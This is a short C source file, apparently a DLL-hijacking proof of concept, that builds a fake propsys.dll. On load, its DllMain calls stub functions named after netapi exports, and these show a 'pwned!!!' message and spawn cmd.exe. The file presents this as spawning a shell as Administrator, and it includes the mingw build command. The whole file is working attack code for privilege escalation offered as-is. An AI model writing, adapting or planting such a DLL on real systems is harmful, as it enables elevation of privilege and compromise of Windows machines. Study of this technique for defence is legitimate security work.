#include <windows.h> 
#include <Winuser.h> 
 
// x86-w64-mingw32-gcc -shared -o propsys.dll propsys.c -lcomctl32 -Wl,--subsystem,windows  

//  @404death

int NetApiBufferFree(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
//    WinExec("C:\\windows\\system32\\cmd.exe", 0);
//    ExitProcess(0);
    return 0;
}
int NetpIsRemote(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int NetpwNameValidate(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
//    WinExec("C:\\windows\\system32\\cmd.exe", 0);
//    ExitProcess(0);
    return 0;
}
int NetpwPathType(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}

BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  
{  
  if (fdwReason == DLL_PROCESS_ATTACH)  
  {  
    NetApiBufferFree(); 
    NetpIsRemote(); 
    NetpwNameValidate(); 
    NetpwPathType(); 
  }  
  
  return TRUE;  
}  